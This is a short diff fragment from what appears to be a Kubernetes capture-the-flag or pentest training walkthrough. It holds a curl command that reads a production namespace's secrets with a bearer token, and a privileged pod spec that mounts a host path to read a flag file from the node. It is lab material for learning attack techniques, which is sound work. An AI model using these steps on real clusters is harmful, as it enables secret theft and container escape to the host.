@@ -17,9 +17,10 @@ curl -ks -H "Authorization: Bearer $TOK" \
   https://kubernetes.default.svc/api/v1/namespaces/prod/secrets
 
 # privileged pod -> flag via pod log (POST body to the API)
+# NOTE: imagePullPolicy MUST be IfNotPresent (local image, no registry)
 {"apiVersion":"v1","kind":"Pod","metadata":{"name":"x","namespace":"prod"},
- "spec":{"serviceAccountName":"default","containers":[{"name":"x",
- "image":"pentrain/shop-app:latest","securityContext":{"privileged":true},
+ "spec":{"containers":[{"name":"x","image":"pentrain/shop-app:latest",
+ "imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true},
  "command":["sh","-c","cat /host/root/k8s-flag.txt; sleep 30"],
  "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
  "volumes":[{"name":"h","hostPath":{"path":"/host"}}],
